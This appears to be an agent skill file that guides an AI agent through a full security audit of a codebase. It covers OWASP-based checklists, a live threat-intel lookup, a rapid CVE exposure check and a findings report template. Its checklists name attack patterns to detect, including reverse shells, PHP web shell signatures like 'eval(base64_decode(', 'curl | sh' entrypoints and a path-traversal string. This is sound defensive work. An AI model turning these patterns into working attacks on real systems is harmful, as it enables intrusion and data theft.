---
name: security-audit
description: Systematic, full-coverage security audit of a codebase and the platform it runs on — OWASP Top 10 / ASVS / API Top 10 / LLM Top 10 checkpoints across code, auth, data, supply chain, infrastructure, CI/CD, cloud, and AI agents, plus live threat intel for known or actively exploited CVEs and supply-chain compromises (e.g. PHP2Shell). Use for security audits or reviews, vulnerability assessments, pre-release hardening, pen-test preparation, incident response, and rapid exposure checks when a new CVE or exploit is announced.
compatibility: Works in any agent harness that can search and read files. Web search/fetch (live threat intel) and a shell (optional local scanners) are used when available and permitted.
metadata:
  category: security
  tags: security, audit, vulnerability, owasp, asvs, code-review, cve, threat-intel, supply-chain, runtime, cloud, ci-cd, llm, php, python, javascript
---

# Security Audit Skill

Systematically scan and review a codebase to identify potential security vulnerabilities, misconfigurations, and insecure coding patterns. Produces a prioritised findings report with remediation guidance.

Application code is only part of the attack surface. A flaw in the runtime itself can make even a flawless "Hello World" app remotely exploitable (e.g. PHP2Shell), so every audit covers the code, its dependencies, **and** the platform it runs on — checked against live threat intel, not only the checklists below.

The checkpoints draw on the OWASP Top 10, OWASP ASVS, OWASP API Security Top 10, OWASP Top 10 for LLM Applications, and CWE. Treat them as a floor, not a ceiling: judge anything unusual against first principles.

## When to Use

- Before a release or deployment to production
- When onboarding a new codebase or inheriting legacy code
- After adding authentication, authorisation, or payment flows
- Periodic security health-checks
- Responding to a security incident or pen-test report
- A new critical CVE, exploit, or supply-chain compromise is announced for anything in the stack — run the **Rapid Exposure Check** below

## Audit Workflow

Run the steps in order (steps 2 and 3 can interleave). Agree scope and rules of engagement before touching anything.

### 1. Scope & Reconnaissance

1. Identify the tech stack (language, framework, database, cloud provider).
2. Map entry points: HTTP routes, WebSocket handlers, CLI commands, cron jobs, queue consumers, inbound webhooks, file and email ingestion, desktop IPC and deep links, agent tools.
3. Identify sensitive data flows: auth tokens, PII, payment data, secrets.
4. List third-party dependencies and their **resolved** versions (from lockfiles, not manifest ranges).
5. Build the **runtime & platform inventory** (category Q): every interpreter, app server/SAPI, web server/proxy, base image, and OS — exact version plus the `file:line` that proves it.
6. Record internet exposure and deployment mode per component (public vs. internal, process model, worker reuse).
7. Confirm **rules of engagement**: which repos, environments, and hosts are in scope, and whether scanners or any live environment may be used (never production without explicit approval). If you can't ask (non-interactive or CI runs), stick to a read-only static review and list everything skipped as a coverage gap.
8. Sketch a **threat model**: assets and data classes (credentials, PII, payment and financial data, tenant data); trust boundaries (browser ↔ API, API ↔ data stores, service ↔ third party, agent ↔ tools, tenant ↔ tenant); attacker profiles (anonymous internet user, authenticated user, tenant admin, insider, compromised dependency, prompt-injected agent). Walk STRIDE (spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege) across each boundary to decide where to dig deepest.

### 2. Threat-Intel Pass (mandatory)

A static checklist cannot know about a CVE published yesterday. For every inventoried component:

1. Check the **Active Threat Watchlist** below for a fast match.
2. Look up current advisories for the component **and its deployed version**:
   - CISA KEV (known exploited): https://www.cisa.gov/known-exploited-vulnerabilities-catalog
   - OSV.dev, incl. `MAL-` malicious-package entries: https://osv.dev
   - GitHub Security Advisories: https://github.com/advisories
   - NVD: https://nvd.nist.gov
   - Vendor security pages and release notes (php.net, python.org, nodejs.org, framework changelogs)
   - Recent news (last 30–90 days): `<component> <version> CVE`, `<component> actively exploited`, `<package> malicious version`
   - Support status: https://endoflife.date
3. From the **primary advisory** (vendor or GHSA, not news summaries) extract: affected and fixed versions per branch, preconditions (deployment mode, config flags, enabled features), exploitation status and earliest known exploitation date, interim mitigations, IOCs.
4. Record a verdict per component — **Affected / Not affected / Unknown** — with evidence and the lookup date.
5. Query with component names and versions only — never put secrets, internal hostnames, or customer identifiers in searches.
6. Without web access: say so in the report, rely on the watchlist, and list the components still needing a lookup. Never mark them "Not affected".

### 3. Static Analysis Pass

Walk through the codebase checking each category below. For every finding, record:

- **Category** (e.g. Injection, AuthN, AuthZ)
- **Severity** (Critical / High / Medium / Low / Info)
- **File & line** (or pattern if widespread)
- **Description** of the issue
- **Remediation** steps

Work **source → sink**: start from attacker-controlled input (params, headers, cookies, bodies, files, webhooks, queue messages, third-party API responses, LLM output, tenant-configured settings) and trace it to dangerous sinks (SQL, shell, file paths, templates, HTML/markdown rendering, redirects, outbound requests, deserializers, `eval`). Then work the inverse: every privileged action must sit behind authentication, authorisation, and validation.

Rate **confidence** per finding: *Confirmed* (path traced end to end or reproduced), *Likely* (sink reachable, attacker control probable), *Possible* (pattern match only). Never report raw scanner output without triage.

If the rules of engagement allow:

- **Scanners**: run locally only (see "How to Run the Audit") — never upload code to third-party services without approval.
- **Dynamic checks** against a non-production instance: security headers, CORS responses, authorisation with two test users and two tenants (BOLA/BFLA), rate limits, error verbosity. No destructive payloads, load tests, or third-party targets.

### 4. Findings Report

Output a structured Markdown report:

```
## Security Audit Report

### Summary
- Total findings: N
- Critical: X | High: X | Medium: X | Low: X | Info: X
- Threat intel as of: YYYY-MM-DD (sources consulted)
- Scope: repos and commit SHAs, environments, what was out of scope

### Exposure & Threat-Intel
| Component | Deployed version (evidence) | Advisory | Fixed in | Exploited? | Verdict |
|---|---|---|---|---|---|
| PHP 8.3 (FPM) | floating `php:8.3-fpm` — `api/Dockerfile:1` | CVE-2026-109618 / 109619 | 8.3.36 | Yes, since 2026-10-17 | Unknown — confirm `php -v` in deployed image |

### Coverage
| Category / module | Status |
|---|---|
| A. Secrets & Configuration | Checked — 2 findings |
| Module: Desktop & Local Services | N/A — no desktop app or local server |
| Running versions in production | Not checked — no access |

### Findings

#### [SEV] Category — Short title
- **File**: `path/to/file.py:42`
- **Classification**: CWE-xxx / OWASP category
- **Confidence**: Confirmed / Likely / Possible
- **Description**: …
- **Impact**: …
- **Evidence**: specific code snippet or pattern match that triggered the finding
- **References**: advisory / CVE URLs (required for known-vulnerability findings)
- **Remediation**: …

(repeat for each finding)

### Recommendations
- Priority remediation order
- Architecture changes suggested
- Tooling recommendations
- Coverage gaps (what could not be verified: running versions, logs, other repos)
```

---

## Rapid Exposure Check

Use when asked "are we affected by X?" or when a critical advisory drops. Goal: a defensible verdict per system in one pass.

1. **Read the primary advisory.** Extract affected/fixed versions per branch, preconditions, exploitation status and earliest date, interim mitigations, IOCs.
2. **Find every instance** across all repos in scope — including forks, worktrees, and copies: Dockerfiles, compose/K8s/Helm, CI images, IaC, lockfiles, version files, vendored or bundled copies, admin sidecars, legacy apps.
3. **Resolve the deployed version.** A floating tag (`php:8.3-fpm`, `:latest`) proves only the branch; the patch level depends on when and how the image was built (a rebuild without `--pull` can reuse a stale cached base). Confirm from the running system (`php -v` in the container, image digest, installed package version) — ask the user if you lack access. Package channels can lag upstream; verify, don't assume.
4. **Evaluate preconditions** against the configuration actually applied (ini files, server config, env and per-request overrides).
5. **Verdict per instance**: Affected / Not affected / Unknown, with `file:line` evidence. Treat Unknown on an internet-facing system as Affected for prioritisation.
6. **Remediate**, in order of preference: patch → the advisory's interim mitigations → edge/WAF rules (known vectors only) → take offline until patched.
7. **Assess compromise.** If an affected instance was reachable, hunt from the **earliest known exploitation date**, not the disclosure date — patching does not evict an attacker (category P, watchlist IOCs).
8. **Add a watchlist entry** using the template below.

---

## Audit Categories & Checklists

Apply every core category (A–Z). Apply a stack module only when the inventory contains that stack, and record skipped ones as N/A in the coverage table.

### Application Security (A–I)

#### A. Secrets & Configuration

- [ ] Hardcoded API keys, tokens, passwords, or connection strings in source
- [ ] `.env` files committed to version control
- [ ] Secrets in Docker build args, CI logs, or error messages
- [ ] Default credentials left in seed data or config
- [ ] Missing or weak `SECRET_KEY` / JWT signing keys
- [ ] Debug mode enabled in production configuration
- [ ] Verbose error messages exposing stack traces or internals
- [ ] Missing or misconfigured `.gitignore` (leaking `.env`, `*.pem`, `*.key`)
- [ ] Secrets in git **history**, not only HEAD — scan all commits and tags; anything ever committed must be rotated (deleting the file is not enough)
- [ ] Secrets baked into images or build artifacts (`ARG`/`ENV` values visible in `docker history`, copied `.env` files, `COPY . .` without a `.dockerignore`)
- [ ] Secrets exposed to browsers through public env prefixes (`VITE_`, `NUXT_PUBLIC_`, `NEXT_PUBLIC_`, `REACT_APP_`) or public runtime config
- [ ] Real values in `.env.example` or sample configs
- [ ] No secret manager or rotation process; the same secrets shared across environments
- [ ] Framework master keys weak, default, reused, or leaked (Laravel `APP_KEY`, Django `SECRET_KEY`, Rails `secret_key_base`) — a leaked key often allows cookie forgery or deserialization RCE
- [ ] Test or debug bypasses reachable in production: magic headers or params (`X-Debug`, `?debug=1`), hardcoded test users, `SKIP_AUTH`-style flags
- [ ] Insecure first-run defaults: open registration, default admin accounts, setup or install wizards still reachable

#### B. Injection Vulnerabilities

- [ ] **SQL Injection**: raw SQL with string concatenation or f-strings instead of parameterised queries
- [ ] **NoSQL Injection**: unvalidated user input in MongoDB/Firestore queries
- [ ] **Command Injection**: `os.system()`, `subprocess.run(shell=True)`, backticks with user input
- [ ] **Template Injection (SSTI)**: user input rendered in server-side templates without escaping
- [ ] **LDAP / XPath Injection**: unescaped input in directory or XML queries
- [ ] **Log Injection**: user-controlled data written to logs without sanitisation (enables log forging)
- [ ] **Header Injection**: user input reflected in HTTP response headers (CRLF injection)
- [ ] **ORM escape hatches** with interpolation: `whereRaw`/`DB::raw`/`orderByRaw`, SQLAlchemy `text()`, Django `.raw()`/`.extra()`, Sequelize `literal()`, Prisma `$queryRawUnsafe`
- [ ] **Identifiers from input**: `ORDER BY` columns, table names, or sort direction taken from requests (these can't be parameterised — allowlist them)
- [ ] **Second-order injection**: stored values later concatenated into queries, commands, or templates
- [ ] **Argument injection**: user values passed to CLI tools (`git`, `curl`, `tar`, `ffmpeg`, ImageMagick) without `--` separation or option filtering
- [ ] **Expression / formula injection**: input evaluated by expression or rule engines (SpEL, OGNL, `simpleeval`, spreadsheet formulas)
- [ ] **Format-string injection**: user-controlled format strings (Python `str.format` with `{0.__class__}`-style attribute access, `printf` family)
- [ ] **Email header injection**: CRLF in `To`/`Subject`/`From`, PHP `mail()` additional headers or parameters
- [ ] **CSV / spreadsheet formula injection**: exported cells beginning with `=`, `+`, `-`, `@`, tab, or CR not neutralised
- [ ] **Query-language injection**: string-built GraphQL, Elasticsearch DSL, Cypher, JQL, or OData filters
- [ ] **Regex injection**: user input compiled into regexes without escaping (also ReDoS — see X)

#### C. Authentication (AuthN)

- [ ] Missing authentication on sensitive endpoints
- [ ] Weak password policy (no minimum length, no complexity)
- [ ] Passwords stored in plaintext or with weak hashing (MD5, SHA-1, unsalted)
- [ ] JWT tokens without expiration (`exp` claim)
- [ ] JWT signed with weak or hardcoded secret
- [ ] JWT algorithm confusion (`alg: none` accepted)
- [ ] Session tokens predictable or not rotated on login/logout
- [ ] Missing rate-limiting on login / password-reset endpoints
- [ ] Password reset tokens that don't expire or are reusable
- [ ] OAuth/OIDC misconfiguration (missing state parameter, open redirect in callback)
- [ ] Password hashing without a modern adaptive algorithm and cost (Argon2id, scrypt, bcrypt cost ≥ 10, PBKDF2-SHA256 ≥ 600,000 iterations); no rehash-on-login path for legacy hashes
- [ ] No breached-password screening; composition rules instead of a length-based policy (follow current NIST SP 800-63B minimums; allow at least 64 characters)
- [ ] **Account enumeration**: login, registration, reset, or MFA responses (content, status, or timing) differ for existing vs. unknown accounts
- [ ] **Brute force / credential stuffing**: no per-account and per-IP throttling or progressive delays; lockouts that let attackers lock victims out
- [ ] **MFA**: missing for admins and privileged actions; bypassable by skipping a step or calling the post-MFA endpoint directly; OTPs reusable, unthrottled, or long-lived; recovery codes stored in plaintext
- [ ] **Reset flow**: tokens under 128 bits of entropy, not single-use, not invalidated after a password change, or leaked via `Referer`; reset links built from the `Host` header (poisoning)
- [ ] Email, phone, MFA, or password changes without re-authentication and a notification to the previous address
- [ ] Usernames and emails not case-folded and Unicode-normalised before uniqueness checks (collisions → account takeover)
- [ ] **Session fixation**: session ID not regenerated on login or privilege change
- [ ] Sessions not invalidated server-side on logout, password change, or account disable; no idle and absolute timeouts
- [ ] Refresh tokens not rotated, without reuse detection, never expiring, or not bound to the client
- [ ] JWT validation gaps: `aud`/`iss` unchecked, `kid`/`jku`/`x5u` headers trusted (key injection), RS256→HS256 key confusion, `decode` without verification used for decisions, roles in long-lived tokens (still valid after demotion), sensitive data in readable payloads
- [ ] OAuth/OIDC: no PKCE for public clients (SPA, mobile, desktop), `redirect_uri` not exact-matched, implicit flow, `nonce` and `id_token` signature/`aud`/`exp` not validated, tokens passed in URLs
- [ ] Account linking on unverified IdP email claims (`email_verified` ignored) → pre-account takeover
- [ ] SAML: unsigned assertions accepted, XML signature wrapping, `Audience`/`Recipient`/`NotOnOrAfter` unchecked, assertion replay
- [ ] Machine credentials: API keys stored in plaintext (store hashes), unscoped, non-expiring, unrotatable, or without an identifiable prefix for leak scanning; "internal" endpoints that trust network location instead of authenticating callers

#### D. Authorisation (AuthZ)

- [ ] **IDOR**: direct object references without ownership checks (e.g. `/api/users/123/data`)
- [ ] Missing role/permission checks on admin or privileged endpoints
- [ ] Horizontal privilege escalation (user A accessing user B's resources)
- [ ] Vertical privilege escalation (regular user accessing admin functions)
- [ ] Mass assignment: accepting unexpected fields that modify roles/permissions
- [ ] API endpoints that bypass frontend-enforced access controls
- [ ] File upload/download endpoints without authorisation
- [ ] Not deny-by-default: new routes or handlers are public unless someone adds a check; no central policy layer
- [ ] **Function-level (BFLA)**: privileged API functions callable directly by regular users
- [ ] **Property-level (BOPLA)**: users read or write fields they shouldn't (role, owner, price, status, tenant) on objects they may otherwise access
- [ ] Decisions based on client-supplied identity or role (request body, `X-User-Id`/`X-Org-Id` headers, hidden fields, unverified token claims)
- [ ] Check performed on one ID but the action applied to another (parameter swap, TOCTOU between check and use)
- [ ] Authorisation that fails open on errors (exceptions swallowed, `null` policy result treated as allow)
- [ ] HTTP method override (`X-HTTP-Method-Override`, `_method`) or verb tampering bypassing method-specific rules
- [ ] Revoked users or roles keep access through live sessions, WebSockets, refresh tokens, API keys, or cached permissions
- [ ] Bulk, export, search, and reporting endpoints skipping the per-object checks that single-item endpoints enforce
- [ ] Impersonation ("log in as") without scope limits, audit trail, or visible indication
- [ ] Sequential or guessable IDs relied on for secrecy — IDs are not access control, and neither are UUIDs

#### E. Cross-Site Scripting (XSS)

- [ ] Reflected XSS: user input echoed in HTML without encoding
- [ ] Stored XSS: database content rendered without escaping (comments, profiles, etc.)
- [ ] DOM XSS: `innerHTML`, `document.write()`, `eval()` with untrusted data
- [ ] Missing `Content-Security-Policy` header
- [ ] SVG/HTML file uploads rendered inline
- [ ] Framework escape hatches on untrusted data: `v-html`, `dangerouslySetInnerHTML`, Blade `{!! !!}`, Jinja `|safe`/`Markup()`/`autoescape=False`, Django `mark_safe`, Angular `bypassSecurityTrust*`
- [ ] Markdown or rich text rendered to HTML without a sanitizer (DOMPurify, nh3/bleach) — including chat messages and LLM output
- [ ] `javascript:` or `data:` URLs from user data in `href`, `src`, `action`, or `window.open`
- [ ] Weak CSP: `unsafe-inline`/`unsafe-eval`, broad script sources (CDNs that host user content), missing `object-src 'none'` and `base-uri`; prefer nonces or hashes with `strict-dynamic`
- [ ] User data placed into inline `<script>` blocks, hydration state, or event-handler attributes without context-correct encoding
- [ ] User-uploaded HTML, SVG, or PDF served from the application origin (use a separate sandbox domain and `Content-Disposition: attachment`)
- [ ] Error pages, 404 pages, and email templates reflecting input unescaped

#### F. Cross-Site Request Forgery (CSRF)

- [ ] State-changing endpoints (POST/PUT/DELETE) without CSRF tokens
- [ ] CSRF tokens not validated server-side
- [ ] `SameSite` cookie attribute not set or set to `None` without `Secure`
- [ ] CORS misconfiguration allowing arbitrary origins with credentials
- [ ] State-changing `GET` requests (logout, delete, approve, toggle)
- [ ] JSON endpoints that also accept form-encoded, `multipart/form-data`, or `text/plain` bodies (form-postable from any site)
- [ ] CSRF exemption lists grown too broad (`$except`, `@csrf_exempt`), or "API" routes skipping checks while still using cookie auth
- [ ] Login CSRF, and OAuth callbacks without `state` validation
- [ ] Local services (localhost APIs, desktop backends) accepting cross-site requests from any web page — see Module: Desktop & Local Services

#### G. CORS, HTTP Security Headers & HTTP Layer

- [ ] `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`
- [ ] Wildcard or overly broad allowed origins
- [ ] Missing `Strict-Transport-Security` (HSTS)
- [ ] Missing `X-Content-Type-Options: nosniff`
- [ ] Missing `X-Frame-Options` or `frame-ancestors` CSP directive
- [ ] Missing `Referrer-Policy`
- [ ] Cookies without `Secure`, `HttpOnly`, or `SameSite` flags
- [ ] Flawed origin checks: substring/suffix matching (`evilexample.com` passing `endsWith("example.com")`), unescaped dots in regexes, reflected `Origin`, `null` origin allowed
- [ ] Missing `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`, and `Permissions-Policy` where relevant
- [ ] Authenticated or personalised responses cacheable by shared caches/CDNs (no `Cache-Control: no-store`/`private`; `Vary` missing)
- [ ] **Host header attacks**: absolute URLs, reset links, or redirects built from `Host`/`X-Forwarded-Host` without an allowed-hosts list
- [ ] **Web cache poisoning / deception**: unkeyed headers changing responses; path confusion (`/account/x.css`) making private pages cacheable
- [ ] **Request smuggling / desync**: proxy and backend parse `Content-Length`/`Transfer-Encoding` differently; HTTP/2 downgrade without normalisation
- [ ] **Proxy trust**: `X-Forwarded-For`/`X-Real-IP` accepted from any source (trusted proxies `*`, `--forwarded-allow-ips='*'`) → spoofable rate limits, IP allowlists, and audit logs
- [ ] HTTP parameter pollution: duplicate parameters interpreted differently by proxy, WAF, and application
- [ ] TLS below 1.2 or weak ciphers; HSTS without `includeSubDomains` where appropriate; mixed content

#### H. Data Exposure & Privacy

- [ ] API responses leaking sensitive fields (passwords, tokens, internal IDs, PII)
- [ ] Verbose error responses in production (stack traces, SQL queries)
- [ ] Logs containing PII, tokens, or full request bodies
- [ ] No encryption at rest for sensitive database columns
- [ ] No TLS enforcement (HTTP allowed alongside HTTPS)
- [ ] GraphQL introspection enabled in production
- [ ] Debug endpoints (`/debug`, `/phpinfo`, `/__debug__`) exposed
- [ ] Sensitive data in URLs (tokens, IDs, PII in query strings) — leaks into logs, browser history, and `Referer`
- [ ] Whole ORM objects returned instead of explicit response schemas or serializers
- [ ] No data classification or minimisation; more collected or kept than needed
- [ ] No retention and deletion schedule; "deleted" data surviving in backups, search indexes, caches, logs, analytics, or vector stores
- [ ] Personal data sent to third parties (analytics, error trackers, LLM providers) without a legal basis, contract, redaction, or cross-border review
- [ ] Compliance hooks flagged for review where applicable: POPIA (South Africa, incl. special personal information and ID numbers), GDPR (lawful basis, data-subject rights, breach notification), PCI DSS (card data)
- [ ] Error trackers and session-replay tools capturing passwords, tokens, or form contents (no scrubbing or masking)
- [ ] Sensitive fields unmasked in UIs, exports, and support tooling (full ID numbers, bank details)
- [ ] Sensitive pages and fields cached by browsers or autofilled

#### I. File Upload & Storage

- [ ] No file-type validation (MIME type + magic bytes)
- [ ] No file-size limits
- [ ] Uploaded files stored in web-accessible directories
- [ ] Executable files (`.php`, `.py`, `.sh`, `.exe`) not blocked
- [ ] Path traversal in file names (`../../etc/passwd`)
- [ ] Missing virus/malware scanning on uploads
- [ ] Presigned URLs with excessively long expiration
- [ ] Client filenames used in storage paths (traversal, overwrite, XSS in listings) — generate names server-side
- [ ] Client `Content-Type` trusted; extension checks bypassable (`.php.jpg`, `.phtml`, `.phar`, case changes, trailing dots, null bytes)
- [ ] Untrusted files processed without hardening: ImageMagick/Ghostscript policies, Pillow decompression-bomb limits, PDF and Office parsers, `ffmpeg`
- [ ] HTML-to-PDF or screenshot renderers (wkhtmltopdf, headless Chromium) given user HTML → SSRF and local file read (`file://`, iframes)
- [ ] Archives extracted without zip-slip and zip-bomb protection (see S)
- [ ] Private files reachable via guessable public URLs instead of authorised downloads or short-lived signed URLs
- [ ] Metadata not stripped where it matters (photo GPS, document author fields)
- [ ] Storage listable, or upload directories executable by the web server

### Supply Chain, Platform & Operations (J–Q)

#### J. Dependency & Supply Chain

- [ ] Known CVEs in direct and transitive dependencies, checked against **resolved lockfile versions** (`npm audit`, `pip-audit`, `composer audit`, `osv-scanner`) — these cover packages only, not the runtime (see Q)
- [ ] Outdated packages with known vulnerabilities
- [ ] Lockfile not committed (`package-lock.json`, `poetry.lock`, `uv.lock`, `composer.lock`)
- [ ] No automated dependency scanning in CI (Dependabot, Snyk, Trivy)
- [ ] Typosquatting risk (verify package names match intended libraries)
- [ ] Known-malicious or compromised releases of legitimate packages or images (OSV `MAL-` entries, vendor incident notices — see watchlist)
- [ ] Floating references that auto-pull a compromised release: `latest`/`main` image tags, unpinned digests, `COPY --from=<image>:latest`, unbounded version ranges
- [ ] No release-age cooldown on new versions (Renovate `minimumReleaseAge`, Dependabot `cooldown`, pnpm `minimumReleaseAge`, uv `exclude-newer`) — malicious releases are usually caught and pulled within hours or days
- [ ] Install- or startup-time execution hooks: unexpected `*.pth`, `sitecustomize.py`, or `usercustomize.py` in site-packages; npm `preinstall`/`install`/`postinstall` scripts; Composer `scripts` and broad `allow-plugins`
- [ ] Release pipeline: long-lived tokens that can both trigger and approve releases, no trusted publishing (OIDC), no hardware-backed approval for publishing
- [ ] Dependency confusion: internal package names not reserved or scoped; mixed public and private registries without explicit source pinning
- [ ] Abandoned, single-maintainer, or recently transferred packages in critical paths; vendored libraries never updated
- [ ] Git or URL dependencies pinned to branches rather than commit SHAs
- [ ] No SBOM or provenance for releases (signed artifacts and images, build attestations)

#### K. Cryptography

- [ ] Use of deprecated algorithms (MD5, SHA-1, DES, RC4)
- [ ] Hardcoded encryption keys or IVs
- [ ] ECB mode usage (use GCM or CBC with HMAC)
- [ ] Insufficient key length (< 256-bit for AES, < 2048-bit for RSA)
- [ ] Missing integrity verification (encrypt-then-MAC)
- [ ] Insecure random number generation (`Math.random()`, `random.random()` for security-sensitive values)
- [ ] TLS certificate verification disabled in clients (`verify=False`, `rejectUnauthorized: false`, `CURLOPT_SSL_VERIFYPEER` off, `InsecureSkipVerify`, Laravel `withoutVerifying()`)
- [ ] Secrets, tokens, or MACs compared with `==` instead of constant-time functions (`hmac.compare_digest`, `hash_equals`, `crypto.timingSafeEqual`)
- [ ] Nonce/IV reuse with AES-GCM or ChaCha20-Poly1305; predictable IVs with CBC
- [ ] Home-grown cryptography, or "encryption" by base64/XOR
- [ ] Encryption where hashing is required (reversible passwords), or hashing where secrecy is required
- [ ] RSA PKCS#1 v1.5 encryption padding (use OAEP); undersized or shared keys
- [ ] No key rotation or versioning; keys stored next to the data they protect; no KMS/HSM for high-value keys
- [ ] Security tokens with < 128 bits of entropy or from non-CSPRNG sources (`mt_rand`, `uniqid`, `Math.random`, UUIDv1, timestamps)

#### L. Infrastructure & Deployment

- [ ] Docker containers running as root
- [ ] Overly permissive IAM roles or security groups
- [ ] Database ports exposed to the internet
- [ ] Missing network segmentation
- [ ] No WAF or rate-limiting at the edge
- [ ] SSH keys or cloud credentials in the repository
- [ ] CI/CD pipeline secrets exposed in logs
- [ ] Missing resource limits (CPU/memory) on containers
- [ ] Application code writable at runtime (web user owns the code tree; no `read_only: true` / `readOnlyRootFilesystem`) — lets an RCE persist as a web shell
- [ ] Unrestricted egress from web/app workers (enables second-stage downloads and exfiltration)
- [ ] Long-lived, broad secrets in web-worker env or memory — memory-disclosure bugs leak them; prefer short-lived, scoped credentials
- [ ] FastCGI/PHP-FPM (9000), debug, or admin ports published beyond the internal network
- [ ] Environments not isolated (shared databases, credentials, or networks across dev/staging/prod); production data in lower environments
- [ ] Staging or preview environments public without authentication, or indexed by search engines
- [ ] Admin and operational UIs reachable without network restriction and MFA (database admin tools, queue dashboards, Grafana/Kibana, Swagger/OpenAPI, framework debug panels)
- [ ] Data services without authentication or bound to all interfaces (Redis, Memcached, Elasticsearch/OpenSearch, MongoDB, RabbitMQ management)
- [ ] Dangling DNS records (CNAMEs to deprovisioned cloud resources → subdomain takeover); no SPF/DKIM/DMARC on sending domains
- [ ] Backups unencrypted, reachable with production credentials, never restore-tested, or without an offline/immutable copy
- [ ] No host hardening baseline (automatic security updates, key-only SSH, host firewall)

Deeper checks live in the Containers & Kubernetes, Cloud, CI/CD Pipelines, and Databases & Data Stores modules.

#### M. Logging & Monitoring

- [ ] No structured logging of security events (failed logins, privilege changes)
- [ ] Sensitive data in logs (passwords, tokens, credit card numbers)
- [ ] No alerting on anomalous patterns (brute force, mass data export)
- [ ] Logs not shipped to a centralised, tamper-resistant store
- [ ] Missing audit trail for admin actions
- [ ] LLM gateway or agent logs storing full prompt/response bodies — agents can echo credentials (e.g. CLI OAuth tokens) into responses; redact, and never expose these logs or admin UIs publicly (root cause of the LiteLLM compromise)
- [ ] Logs insufficient to investigate runtime-level exploits: access logs (method, content type, status, response size), runtime error logs at full verbosity, worker crash/restart events — retained long enough to cover pre-disclosure exploitation
- [ ] Audit records missing actor, target, timestamp, source IP, or outcome; no request/correlation IDs across services
- [ ] Logs readable by too many people, or writable/deletable by the application identity
- [ ] No alerting on privilege grants, new admin accounts, MFA disablement, API-key creation, or spikes in 401/403/5xx

#### N. API-Specific

- [ ] No input validation or schema enforcement (use Pydantic, Zod, Joi, etc.)
- [ ] Missing pagination on list endpoints (denial-of-service via unbounded queries)
- [ ] No rate-limiting per user/IP
- [ ] Batch/bulk endpoints without size limits
- [ ] Missing request-size limits (large body DoS)
- [ ] API versioning absent (breaking changes affect consumers)
- [ ] WebSocket connections without authentication or message validation
- [ ] Attacker-controlled input that can force out-of-memory, timeouts, or fatal errors (unbounded parsing/decoding, deep nesting, large in-memory uploads) — beyond DoS, runtime bugs can turn these into memory corruption (PHP2Shell)
- [ ] API inventory gaps: undocumented, deprecated, or old-version endpoints still live; debug routes deployed; public OpenAPI docs for private APIs
- [ ] Unknown fields silently accepted (no `additionalProperties: false` / `extra="forbid"`) — mass-assignment risk
- [ ] Sensitive business flows without anti-automation (sign-up, checkout, OTP/SMS sending, voucher redemption, bookings)
- [ ] GraphQL: no depth/complexity/cost limits, alias and batch abuse (many guesses per request), missing field-level authorisation, `GET` mutations
- [ ] Inconsistent authentication across transports (REST protected, but WebSocket, GraphQL, gRPC, or SSE paths not)
- [ ] "Not found" vs. "forbidden" responses reveal whether objects exist
- [ ] Third-party API responses trusted without validation (see W)

#### O. Frontend-Specific

- [ ] Sensitive data stored in `localStorage` or `sessionStorage`
- [ ] API keys or secrets embedded in client-side JavaScript
- [ ] `eval()` or `Function()` with dynamic input
- [ ] Unvalidated redirects (`window.location = userInput`)
- [ ] Clickjacking (missing `X-Frame-Options` / CSP `frame-ancestors`)
- [ ] Source maps published in production
- [ ] `postMessage` handlers without strict `event.origin` checks; sensitive data posted with target `'*'`
- [ ] Third-party scripts without Subresource Integrity, or loaded from hosts anyone can publish to
- [ ] Prototype pollution through deep merges or query-string/JSON parsing (`__proto__`, `constructor.prototype`)
- [ ] Prices, totals, discounts, or permissions decided client-side
- [ ] Dev servers or devtools reachable in deployed builds or on the network
- [ ] Service workers caching authenticated responses or registered with an overly broad scope
- [ ] Tokens readable by JavaScript where `HttpOnly` cookie sessions would do; tokens leaking to third-party scripts or analytics

#### P. Backdoors & Malicious Patterns

- [ ] Base64-decoded execution
- [ ] Reverse shell patterns
- [ ] Suspicious network listeners combined with command execution
- [ ] Hidden eval from external source
- [ ] Heavily obfuscated string manipulation
- [ ] Covert data exfiltration to external endpoints
- [ ] Dynamic imports from unvalidated variables
- [ ] PHP web shells: `eval` / `assert` / `create_function` / `system` / `exec` / `passthru` / `shell_exec` fed by `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, `$_SERVER`, or `$_FILES`; `eval(base64_decode(`, `gzinflate(`, `str_rot13(` chains
- [ ] Executable code where only data belongs: `*.php`, `*.phtml`, `*.phar` (or `*.php.jpg`) in upload, storage, or cache dirs; `.htaccess` adding PHP handlers; `.user.ini` or `auto_prepend_file` / `auto_append_file` pointing at unexpected files
- [ ] Python startup persistence: `.pth` files that import unknown modules or contain `exec`/base64, and `sitecustomize.py` / `usercustomize.py` in a venv or app image (editable-install, virtualenv, distutils, and coverage `.pth` files are normal)
- [ ] Host persistence: unexpected cron entries, systemd units, `authorized_keys` entries, or admin users in the app database
- [ ] Deployed files that differ from the release artifact (git or image layer) or changed outside a deploy
- [ ] Code that fetches and runs remote code at runtime (downloaded scripts, `curl | sh` in entrypoints, unsigned plugin downloads)
- [ ] Logic that changes behaviour on specific dates, hostnames, users, or environment values (time bombs, targeted triggers)
- [ ] Minified or obfuscated code and binary blobs committed to source directories without provenance

#### Q. Runtime, Platform & Known-Exploited Vulnerabilities

- [ ] Inventory every runtime with its exact version, from all sources:
  - Containers: every `FROM` (incl. multi-stage), `image:` in compose/K8s/Helm, devcontainers, CI job images
  - Version files: `.php-version`, `.python-version`, `.nvmrc`, `.node-version`, `.ruby-version`, `.tool-versions`, `runtime.txt`, `go.mod` (`go`/`toolchain`)
  - Manifests: `composer.json` (`require.php`, `config.platform.php`), `pyproject.toml` (`requires-python`), `package.json` (`engines`)
  - CI setup steps (`setup-php`, `setup-python`, `setup-node`), IaC/Ansible package installs, serverless runtime settings
- [ ] Runtime below the fixed release for a known CVE — language package audits do not check the interpreter itself
- [ ] End-of-life runtime, framework, or OS (no more security fixes)
- [ ] Floating or unpinned base images (`:latest`, `php:8.3-fpm`) — patch level unknowable from the repo; pin a patch version or digest and rebuild with `--pull` when advisories land
- [ ] Repo pinned to a fixed version, but the deployed image or package was built before the fix
- [ ] High-exposure deployment modes (Apache mod_php, CGI, long-lived workers that reuse state across requests) — advisories often hinge on them
- [ ] Per-request runtime config overrides (`.htaccess` `php_value`/`php_flag`, FastCGI `PHP_VALUE`/`PHP_ADMIN_VALUE`, env-injected options)
